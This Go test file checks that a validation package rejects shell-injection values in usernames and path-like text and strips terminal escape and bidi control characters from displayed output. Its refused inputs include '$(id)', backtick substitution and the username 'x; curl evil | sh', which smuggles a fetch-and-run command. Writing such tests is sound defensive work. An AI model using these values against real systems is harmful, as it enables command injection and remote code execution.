package plain_test

import (
	"strings"
	"testing"

	"github.com/frontseat-dev/frontseat/server/internal/plain"
)

// A text written plainly is a path's characters, and something.
func TestATextIsWrittenPlainly(t *testing.T) {
	for _, text := range []string{"someone/code.git", "/usr/bin/git", "git-upload-pack", "a_b+c.d"} {
		if !plain.Text(text) {
			t.Errorf("%q was refused", text)
		}
	}
	for _, text := range []string{"", "a b", "a\nb", "a?b", "a=b", "a%2e", "$(id)", "a`b`", "a'b", `a"b`, "a\\b", "a:b"} {
		if plain.Text(text) {
			t.Errorf("%q was taken", text)
		}
	}
}

// A username is one a forge gives, and nothing a shell or a
// configuration would read otherwise.
func TestAUsernameIsOneAForgeGives(t *testing.T) {
	for _, name := range []string{"x-access-token", "someone", "some.one_2@example.org", strings.Repeat("a", 128)} {
		if !plain.Username(name) {
			t.Errorf("%q was refused", name)
		}
	}
	for _, name := range []string{"", "x; curl evil | sh", "a b", "a\nb", "$(id)", "a`b`", "a'b", `a"b`, "a\\b", "a=b", "a/b", strings.Repeat("a", 129)} {
		if plain.Username(name) {
			t.Errorf("%q was taken", name)
		}
	}
}

// What is shown of a text keeps what a person reads, lines and tabs
// too, and nothing a terminal acts on.
func TestWhatIsShownOfATextIsNothingATerminalActsOn(t *testing.T) {
	for written, shown := range map[string]string{
		"panicked at src/lib.rs:7:9:\n\tthe lock is gone\n": "panicked at src/lib.rs:7:9:\n\tthe lock is gone\n",
		"na\u00efve \u65e5\u672c":                           "na\u00efve \u65e5\u672c",
		"a\x1b[31mb\rc\x00d\x7fe":                           "a[31mbcde",
		"a\u009b31mb":                                       "a31mb",
		"a\u202eb\u2066c\u200bd\ufeffe":                     "abcde",
		"a\u2028b\u2029c":                                   "abc",
		"a\xffb\xe6\x97":                                    "a\ufffdb\ufffd",
	} {
		if got := plain.Shown(written); got != shown {
			t.Errorf("%q is shown as %q, want %q", written, got, shown)
		}
	}
}
